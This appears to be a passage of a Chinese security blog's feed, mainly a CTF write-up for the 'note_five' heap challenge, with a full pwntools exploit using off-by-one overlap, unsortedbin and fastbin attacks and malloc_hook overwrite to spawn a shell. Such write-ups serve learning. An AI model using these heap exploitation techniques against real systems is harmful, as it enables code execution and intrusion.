的位置是否和”/tmp/qira_binary”路径一致，如果不一致，建立新的软连接（<del>我寻思着，如果是nt的话，这软连接恐怕建立不了吧，看不懂了，可能默认是linux吧</del>）</p>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if self.program != &quot;/tmp/qira_binary&quot;:</span><br><span class="line">    try:</span><br><span class="line">        os.unlink(&quot;/tmp/qira_binary&quot;)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br><span class="line">    try:</span><br><span class="line">        os.symlink(os.path.realpath(self.program), &quot;/tmp/qira_binary&quot;)</span><br><span class="line">    except:</span><br><span class="line">        pass</span><br></pre></td></tr></table></figure></li><li><p>最后读取文件的架构，设置qemu的路径</p><h1 id="0x05-调用qira-socat-start-bindserver-函数"><a href="#0x05-调用qira-socat-start-bindserver-函数" class="headerlink" title="0x05 调用qira_socat.start_bindserver()函数"></a>0x05 调用qira_socat.start_bindserver()函数</h1>  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qira_socat.start_bindserver(program, qira_config.SOCAT_PORT, -1, 1, True)</span><br></pre></td></tr></table></figure></li></ul><h1 id="0x06-启动http服务"><a href="#0x06-启动http服务" class="headerlink" title="0x06 启动http服务"></a>0x06 启动http服务</h1><pre><code><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qira_webserver.run_server(args, program)</span><br></pre></td></tr></table></figure></code></pre>]]></content>
    
    <summary type="html">
    
      这么概要分析一下qira的运行流程
    
    </summary>
    
    
    
      <category term="pwn,dbgtools" scheme="http://yoursite.com/tags/pwn-dbgtools/"/>
    
  </entry>
  
  <entry>
    <title>&#39;杂谈&#39;</title>
    <link href="http://yoursite.com/2019/10/02/%E6%9D%82%E8%B0%88/"/>
    <id>http://yoursite.com/2019/10/02/杂谈/</id>
    <published>2019-10-02T11:49:01.000Z</published>
    <updated>2019-10-29T16:07:40.506Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-手机的开发者选项，一些好用的功能"><a href="#0x01-手机的开发者选项，一些好用的功能" class="headerlink" title="0x01 手机的开发者选项，一些好用的功能"></a>0x01 手机的开发者选项，一些好用的功能</h1><p>今天闲着无聊，看了一下手机开发者选项，发现一个比较有意思的功能 <strong>最小宽度</strong>，<del>这个可以修改屏幕的宽度</del>，其效果是你调高最小宽度，整个手机屏幕的像素点好像变多的了，表现为图标变小</p><h1 id="0x02-grep-查找文件内容"><a href="#0x02-grep-查找文件内容" class="headerlink" title="0x02 grep 查找文件内容"></a>0x02 grep 查找文件内容</h1><p>grep -r ‘string’ path 再也不用担心找不到函数了。。。。。</p><h1 id="0x03-linux下which和whereis的区别"><a href="#0x03-linux下which和whereis的区别" class="headerlink" title="0x03 linux下which和whereis的区别"></a>0x03 linux下which和whereis的区别</h1><p>which是直接查找我们设置好的 <strong>PATH</strong> 变量路径下查找，而whereis更广泛</p><h1 id="python关于import的问题"><a href="#python关于import的问题" class="headerlink" title="python关于import的问题"></a>python关于import的问题</h1><p>在b.py里面import a.py是不会调用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if __name__=&apos;__main__&apos;:</span><br><span class="line">    ****</span><br></pre></td></tr></table></figure></p><p>的内容的</p>]]></content>
    
    <summary type="html">
    
      这里记录一下，遇到的一些有趣的东西，有时间再研究一下子
    
    </summary>
    
    
    
      <category term="misc" scheme="http://yoursite.com/tags/misc/"/>
    
  </entry>
  
  <entry>
    <title>linux_kernel杂记</title>
    <link href="http://yoursite.com/2019/09/24/2019-09-24-linux-kernel%E6%9D%82%E8%AE%B0/"/>
    <id>http://yoursite.com/2019/09/24/2019-09-24-linux-kernel杂记/</id>
    <published>2019-09-24T06:24:00.000Z</published>
    <updated>2019-09-24T12:42:34.164Z</updated>
    
    <content type="html"><![CDATA[<ul><li>关于操作系统 <strong>实时模式</strong> 和 <strong>保护模式</strong> 的区别<br><strong>实时模式</strong> 是没有虚拟地址这一层的，代码直接加载物理内存上，对内存操作，也是用的物理内存的真实地址<br><strong>保护模式</strong> 是对于应用层的应用来说的，为了更好的应用动态链接机制，系统让每个进程都有4GB的虚拟地址,之后再映射到真实的物理内存上，其映射关系是由当前进程的 <strong>task_struct</strong> 结构体中的 *mm 结构体控制的</li><li>SysRq<br>查看状态 <strong>cat /proc/sys/kernel/sysrq</strong> ,0为关闭，1为开启，<del>我看到的是176，也是关闭，不过改成1就可以开启了，好神奇。。。。</del><br>暂时开启此功能 <strong>sudo echo 1 /proc/sys/kernel/sysrq</strong> ,暂时关闭 <strong>sudo echo 0 /proc/sys/kernel/sysrq</strong><blockquote><p><kernel source="">/Documentation/sysrq.txt: sysrq.txt</kernel></p></blockquote></li></ul><p>可以查看文档</p><ul><li>ubuntu 双机调试感受<br>这种调试方法优势在于你可以完整的调试一个系统，可以借助被调试机gdb和调试的gdb，完整的调试一个程序，但是，我发现调试机gdb下断点之后，被调试机到断点，调试机的gdb只能发指令，不能看反汇编代码。。。。，调试失败，，，，qemu调试的话，主要是文件系统难搭建，连apt都没有</li></ul>]]></content>
    
    <summary type="html">
    
      这里总结一下，我对linux kernel的理解
    
    </summary>
    
    
    
      <category term="linux,kernel" scheme="http://yoursite.com/tags/linux-kernel/"/>
    
  </entry>
  
  <entry>
    <title>linux kernel pwn初探</title>
    <link href="http://yoursite.com/2019/09/17/linux-kernel-pwn%E5%88%9D%E6%8E%A2/"/>
    <id>http://yoursite.com/2019/09/17/linux-kernel-pwn初探/</id>
    <published>2019-09-17T15:11:02.000Z</published>
    <updated>2019-09-24T06:22:04.084Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>又被卡住了，主要不知道linux内核运行机制，用户态转化成内核态究竟做了些什么，内核态返回用户态又做了一些怎样的操作，<del>虽然，看了一些博客，说是内核会在一个独立的页，sys call的时候，用户态会挂起，保存各个储存器的值，返回的时候再恢复,感觉很抽象，还是没有调试过</del></p><h1 id="0x00-ctf出题方式"><a href="#0x00-ctf出题方式" class="headerlink" title="0x00 ctf出题方式"></a>0x00 ctf出题方式</h1><p>kernel pwn一般会给个驱动程序，找漏洞来提权</p><h1 id="0x01-linux驱动程序运行机制"><a href="#0x01-linux驱动程序运行机制" class="headerlink" title="0x01 linux驱动程序运行机制"></a>0x01 linux驱动程序运行机制</h1><ul><li>linux驱动运行于linux kernel中</li><li>用户一般可以通过c语言的ioctl()函数进行交互</li><li>用户也可以用write()函数和read()和驱动交互（如果驱动程序实现的话），<del>fd指针是驱动的设备的结构体的指针</del></li><li>驱动如果有全局变量的话，直到驱动程序重启，全局变量才会被重置</li><li>驱动程序是常驻内存的，<del>像一个serivce程序</del></li></ul><h1 id="0x02-常规操作"><a href="#0x02-常规操作" class="headerlink" title="0x02 常规操作"></a>0x02 常规操作</h1><ul><li>右键解压硬盘文件（.img,.cpio）</li><li>根据需要改init的文件</li><li>打包指令 <strong>find . | cpio -o -H newc | gzip &gt; ../core.cpio</strong></li></ul><h1 id="0x03-常见的利用方式"><a href="#0x03-常见的利用方式" class="headerlink" title="0x03 常见的利用方式"></a>0x03 常见的利用方式</h1><h2 id="double-fetch"><a href="#double-fetch" class="headerlink" title="double fetch"></a>double fetch</h2><p>简单来说就是，你传给驱动程序一个参数，然后你再新建一个线程去改变这个值就有可能造成非预期的程序流，从而绕过一些不可能过的检查</p><h1 id="有一些还不太清楚待补-有点迷-23333"><a href="#有一些还不太清楚待补-有点迷-23333" class="headerlink" title="有一些还不太清楚待补 有点迷 23333"></a>有一些还不太清楚待补 有点迷 23333</h1>]]></content>
    
    <summary type="html">
    
      刚刚接触kernel pwn，记录一下自己的认识
    
    </summary>
    
    
    
      <category term="linux,kernel" scheme="http://yoursite.com/tags/linux-kernel/"/>
    
  </entry>
  
  <entry>
    <title>global_max_fast利用</title>
    <link href="http://yoursite.com/2019/09/16/global-max-fast%E5%88%A9%E7%94%A8/"/>
    <id>http://yoursite.com/2019/09/16/global-max-fast利用/</id>
    <published>2019-09-15T23:53:59.000Z</published>
    <updated>2019-09-16T07:32:19.987Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>global_max_fast就是程序规定堆的最大的fastbin的size，存于libc的bss段，用gdb动态调试的时候可以输入命令 <strong>p/x &amp;global_max_fast</strong><br><img src="/2019/09/16/global-max-fast利用/global-max-fast.png" alt="global_max_fast"><br>下面根据note_five讲解一下利用过程</p><h1 id="0x01-程序分析"><a href="#0x01-程序分析" class="headerlink" title="0x01 程序分析"></a>0x01 程序分析</h1><h2 id="0x00-checksec"><a href="#0x00-checksec" class="headerlink" title="0x00 checksec"></a>0x00 checksec</h2><p>保护全开没什么好说的<br><img src="/2019/09/16/global-max-fast利用/checksec.png" alt="checksec"></p><h2 id="0x01-漏洞点"><a href="#0x01-漏洞点" class="headerlink" title="0x01 漏洞点"></a>0x01 漏洞点</h2><p>漏洞函数是这个函数<br><img src="/2019/09/16/global-max-fast利用/vul-funtion.png" alt="vul_funtion"><br>很容易看到漏洞点是 <strong>off by one</strong> 但malloc的时候size有个限制<br> <img src="/2019/09/16/global-max-fast利用/size.png" alt="size"></p><p> 这样的话，size大于0x8f，意味着fastbin我们都不能用了，最重要的是libc中0x7f就不能再伪造size了</p><h2 id="0x02-思路"><a href="#0x02-思路" class="headerlink" title="0x02 思路"></a>0x02 思路</h2><p> 常规的话：<br> leak libc address</p><p> control malloc_hook or free hook</p><p> 如果不能leak libc address的话，就只能考虑伪造chunk 低字节改了</p><h2 id="0x03-复现"><a href="#0x03-复现" class="headerlink" title="0x03 复现"></a>0x03 复现</h2><p>参考 <strong>ex</strong> 师傅的wp</p><p><a href="http://blog.eonew.cn/" title="http://blog.eonew.cn/" target="_blank" rel="noopener">附上ex师傅的博客</a></p><h3 id="0x00-overlap"><a href="#0x00-overlap" class="headerlink" title="0x00 overlap"></a>0x00 overlap</h3><p>首先学到 <strong>overlap</strong> 新姿势<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">New(<span class="number">0</span>, <span class="number">0x98</span>)</span><br><span class="line">New(<span class="number">1</span>, <span class="number">0x98</span>)</span><br><span class="line">New(<span class="number">2</span>, <span class="number">0x98</span>)</span><br><span class="line">New(<span class="number">3</span>, <span class="number">0x98</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">1</span>, <span class="string">'a'</span> * <span class="number">0x90</span> + p64(<span class="number">0x140</span>) + p8(<span class="number">0xa0</span>))<span class="comment">#修改chunk2的preinuse位让chunk2</span></span><br><span class="line">delete(<span class="number">2</span>)</span><br></pre></td></tr></table></figure></p><p>首先malloc 4个chunk，先free 第0个chunk，然后再布置好 <strong>chunk 2的presize=chunk 0的size+chunk 1的size</strong> ，然后把chunk preinuse位置0，之后free chunk 2的过程中就会检查前一个chunk是否处于free状态，如果是就会发生合并，这样的话，就达到了overlap</p><h3 id="0x01-unsortedbin-attack"><a href="#0x01-unsortedbin-attack" class="headerlink" title="0x01 unsortedbin attack"></a>0x01 unsortedbin attack</h3><p>unsortedbin链表是循环链表，当有一个新的chunk插入链表链表的时候，会链表尾插入，从链表取出时，会进行<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/* remove from unsorted list */</span><br><span class="line">if (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">  malloc_printerr (&quot;malloc(): corrupted unsorted chunks 3&quot;);</span><br><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure></p><p>如果我们能控制chunk的bk就能向任意address写入unsortedbin链表的表尾的地址</p><p>前一步达到了overlap，bk当然也能控制，然后就是改global_max_fast的值，利用低字节改，爆破一下就可以了</p><h3 id="0x02-fastbin-attack"><a href="#0x02-fastbin-attack" class="headerlink" title="0x02 fastbin attack"></a>0x02 fastbin attack</h3><p>改了global_max_fast，基本上你malloc的chunk都是fastbin，但是有个问题就是你free的bin的怎么出现libc的地址，这个时候就要用到上一步的unsortedbin链表了<br><img src="/2019/09/16/global-max-fast利用/unsortedbin.png" alt="unsortedbin"></p><p>这里可以先free一个精心控制size的chunk，就可以让它正好放在unsortedbin的位置，因为unsortedbin在libc中在fastbin链表的下面，而fastbin插入的时候根据size算表头的位置,这样会溢出fastbin表头位置覆盖到unsortedbin链表,fastbin是单向列表，插入的时候，从表头插入，malloc的时候从表头取，这样fastbin fd指针就会有libc的address</p><h3 id="0x03-leak-libc-address"><a href="#0x03-leak-libc-address" class="headerlink" title="0x03 leak libc address"></a>0x03 leak libc address</h3><p>常规的话就是控制stdout结构体，由于size的限制，好用的0x7f不能用了，但是，std结构体中有0xffffffffffffffff<br><img src="/2019/09/16/global-max-fast利用/fakesize.png" alt="fakesize"></p><p>后面刚好是这个位置+8刚好是0,而我们可以改fastbin chunk的size和bk，malloc到这里</p><h3 id="0x04-control-malloc-hook"><a href="#0x04-control-malloc-hook" class="headerlink" title="0x04 control malloc_hook"></a>0x04 control malloc_hook</h3><p>由于malloc_hook的位置在stdin结构体下面，而stdin结构体也有0xffffffffffffffff的值，所以，就能控制malloc_hook</p><h3 id="one-gadget失效"><a href="#one-gadget失效" class="headerlink" title="one_gadget失效"></a>one_gadget失效</h3><p>由于one_gadget全部失效，但是控制malloc_hook的时候同时也能控制realloc_hook,可以用realloc_hook填入one_gadget，malloc_hook填入realloc函数的地址来调整stack使one_gadget生效</p><h1 id="0x02-完整exp"><a href="#0x02-完整exp" class="headerlink" title="0x02 完整exp"></a>0x02 完整exp</h1><p>建议调试的时候关闭alsr<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line">echo 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python2</span><br><span class="line"># -*- coding:utf-8 -*-</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">import os</span><br><span class="line">import struct</span><br><span class="line">import random</span><br><span class="line">import time</span><br><span class="line">import sys</span><br><span class="line">import signal</span><br><span class="line"></span><br><span class="line">salt = os.getenv(&apos;GDB_SALT&apos;) if (os.getenv(&apos;GDB_SALT&apos;)) else &apos;&apos;</span><br><span class="line"></span><br><span class="line">def clear(signum=None, stack=None):</span><br><span class="line">    print(&apos;Strip  all debugging information&apos;)</span><br><span class="line">    os.system(&apos;rm -f /tmp/gdb_symbols&#123;&#125;* /tmp/gdb_pid&#123;&#125;* /tmp/gdb_script&#123;&#125;*&apos;.replace(&apos;&#123;&#125;&apos;, salt))</span><br><span class="line">    exit(0)</span><br><span class="line"></span><br><span class="line">for sig in [signal.SIGINT, signal.SIGHUP, signal.SIGTERM]:</span><br><span class="line">    signal.signal(sig, clear)</span><br><span class="line"></span><br><span class="line"># # Create a symbol file for GDB debugging</span><br><span class="line"># try:</span><br><span class="line">#     gdb_symbols = &apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">#     &apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">#     f = open(&apos;/tmp/gdb_symbols&#123;&#125;.c&apos;.replace(&apos;&#123;&#125;&apos;, salt), &apos;w&apos;)</span><br><span class="line">#     f.write(gdb_symbols)</span><br><span class="line">#     f.close()</span><br><span class="line">#     os.system(&apos;gcc -g -shared /tmp/gdb_symbols&#123;&#125;.c -o /tmp/gdb_symbols&#123;&#125;.so&apos;.replace(&apos;&#123;&#125;&apos;, salt))</span><br><span class="line">#     # os.system(&apos;gcc -g -m32 -shared /tmp/gdb_symbols&#123;&#125;.c -o /tmp/gdb_symbols&#123;&#125;.so&apos;.replace(&apos;&#123;&#125;&apos;, salt))</span><br><span class="line"># except Exception as e:</span><br><span class="line">#     print(e)</span><br><span class="line"></span><br><span class="line">context.arch = &apos;amd64&apos;</span><br><span class="line"># context.arch = &apos;i386&apos;</span><br><span class="line"># context.log_level = &apos;debug&apos;</span><br><span class="line">execve_file = &apos;./note_five&apos;</span><br><span class="line"># sh = process(execve_file, env=&#123;&apos;LD_PRELOAD&apos;: &apos;/tmp/gdb_symbols&#123;&#125;.so&apos;.replace(&apos;&#123;&#125;&apos;, salt)&#125;)</span><br><span class="line">sh = process(execve_file)</span><br><span class="line">#sh = remote(&apos;112.126.103.195&apos;, 9999)</span><br><span class="line">elf = ELF(execve_file)</span><br><span class="line"># libc = ELF(&apos;./libc-2.27.so&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/x86_64-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line"># Create temporary files for GDB debugging</span><br><span class="line">try:</span><br><span class="line">    gdbscript = &apos;&apos;&apos;</span><br><span class="line">    def pr</span><br><span class="line">        x/5gx $rebase(0x202080)</span><br><span class="line">        end</span><br><span class="line"></span><br><span class="line">    b malloc</span><br><span class="line">    &apos;&apos;&apos;</span><br><span class="line"></span><br><span class="line">    f = open(&apos;/tmp/gdb_pid&#123;&#125;&apos;.replace(&apos;&#123;&#125;&apos;, salt), &apos;w&apos;)</span><br><span class="line">    f.write(str(proc.pidof(sh)[0]))</span><br><span class="line">    f.close()</span><br><span class="line"></span><br><span class="line">    f = open(&apos;/tmp/gdb_script&#123;&#125;&apos;.replace(&apos;&#123;&#125;&apos;, salt), &apos;w&apos;)</span><br><span class="line">    f.write(gdbscript)</span><br><span class="line">    f.close()</span><br><span class="line">except Exception as e:</span><br><span class="line">    print(e)</span><br><span class="line"></span><br><span class="line">def New(index, size):</span><br><span class="line">    sh.sendlineafter(&apos;&gt;&gt; &apos;, &apos;1&apos;)</span><br><span class="line">    sh.sendlineafter(&apos;idx: &apos;, str(index))</span><br><span class="line">    sh.sendlineafter(&apos;size: &apos;, str(size))</span><br><span class="line"></span><br><span class="line">def edit(index, content):</span><br><span class="line">    sh.sendlineafter(&apos;&gt;&gt; &apos;, &apos;2&apos;)</span><br><span class="line">    sh.sendlineafter(&apos;idx: &apos;, str(index))</span><br><span class="line">    sh.sendafter(&apos;content: &apos;, content)</span><br><span class="line"></span><br><span class="line">def delete(index):</span><br><span class="line">    sh.sendlineafter(&apos;&gt;&gt; &apos;, &apos;3&apos;)</span><br><span class="line">    sh.sendlineafter(&apos;idx: &apos;, str(index))</span><br><span class="line">def b():</span><br><span class="line">raw_input(&apos;##&apos;)</span><br><span class="line">New(0, 0x98)</span><br><span class="line">New(1, 0x98)</span><br><span class="line">New(2, 0x98)</span><br><span class="line">New(3, 0x98)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line">delete(0)</span><br><span class="line">edit(1, &apos;a&apos; * 0x90 + p64(0x140) + p8(0xa0))</span><br><span class="line">delete(2)</span><br><span class="line">New(0, 0xe8)</span><br><span class="line"></span><br><span class="line">edit(1, &apos;a&apos; * 0x40 + p64(0) + p64(0xf1) + p64(0) + p16(0x37f8 - 0x10) + &apos;\n&apos;)</span><br><span class="line">New(4, 0xe8)</span><br><span class="line">b()</span><br><span class="line">delete(4)</span><br><span class="line">b()</span><br><span class="line"></span><br><span class="line">edit(1, &apos;a&apos; * 0x40 + p64(0) + p64(0xf1) + p16(0x25cf) + &apos;\n&apos;)</span><br><span class="line">b()</span><br><span class="line">New(4, 0xe8)</span><br><span class="line">b()</span><br><span class="line">New(0, 0xe8)</span><br><span class="line">b()</span><br><span class="line">edit(0, &apos;b&apos; * 0x41 + p64(0xfbad2887 | 0x1000) + p64(0) * 3 + p8(0x88) + &apos;\n&apos;)</span><br><span class="line">result = sh.recvn(8)</span><br><span class="line">libc_addr = u64(result) - libc.symbols[&apos;_IO_2_1_stdin_&apos;]</span><br><span class="line">log.success(&apos;libc_addr: &apos; + hex(libc_addr))</span><br><span class="line">b()</span><br><span class="line">delete(4)</span><br><span class="line">b()</span><br><span class="line">edit(1, &apos;a&apos; * 0x40 + p64(0) + p64(0xf1) + p64(libc_addr + libc.symbols[&apos;_IO_2_1_stdin_&apos;] + 143) + &apos;\n&apos;)</span><br><span class="line">b()</span><br><span class="line">New(4, 0xe8)</span><br><span class="line">b()</span><br><span class="line">New(0, 0xe8)</span><br><span class="line">b()</span><br><span class="line">edit(0, &apos;\0&apos; * 0xe1 + p32(0xf1) + &apos;\n&apos;)</span><br><span class="line">b()</span><br><span class="line">delete(4)</span><br><span class="line">b()</span><br><span class="line">edit(1, &apos;a&apos; * 0x40 + p64(0) + p64(0xf1) + p64(libc_addr + libc.symbols[&apos;_IO_2_1_stdin_&apos;] + 376) + &apos;\n&apos;)</span><br><span class="line">b()</span><br><span class="line">New(4, 0xe8)</span><br><span class="line">b()</span><br><span class="line">New(0, 0xe8)</span><br><span class="line">b()</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">0x45216 execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  rax == NULL</span><br><span class="line"></span><br><span class="line">0x4526a execve(&quot;/bin/sh&quot;, rsp+0x30, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x30] == NULL</span><br><span class="line"></span><br><span class="line">0xf02a4 execve(&quot;/bin/sh&quot;, rsp+0x50, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x50] == NULL</span><br><span class="line"></span><br><span class="line">0xf1147 execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="line">constraints:</span><br><span class="line">  [rsp+0x70] == NULL</span><br><span class="line">&apos;&apos;&apos;</span><br><span class="line">edit(0, &apos;\0&apos; * 0xa0 + p64(libc_addr + 0x4526a) + p64(libc_addr + libc.symbols[&apos;realloc&apos;] + 13) + &apos;\n&apos;)</span><br><span class="line">b()</span><br><span class="line"># pause()</span><br><span class="line">New(0, 0xe8)</span><br><span class="line"></span><br><span class="line">sh.sendline(&apos;cat flag&apos;)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br><span class="line">clear()</span><br></pre></td></tr></table></figure><h1 id="0x3-踩坑"><a href="#0x3-踩坑" class="headerlink" title="0x3 踩坑"></a>0x3 踩坑</h1><ul><li>比赛的时候，由于没有做过改global_max_fast的题目，不知道这么好用，没有注意到0xffffffffffffffff,fastbin的fd也没想到unsortedbin，以为不能leak，就用了FSOP爆破一个半字节，一个小时没出来。。。。。2333 调试过程堪称艰苦</li><li>赛后,没看ex师傅的exp的时候，也尝试自己用global_max_fast free之后crash，不知道怎么回事，之后误删虚拟机exp也没了。。。。有时间再探究一下</li><li>附上自己辛苦写的exp<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># 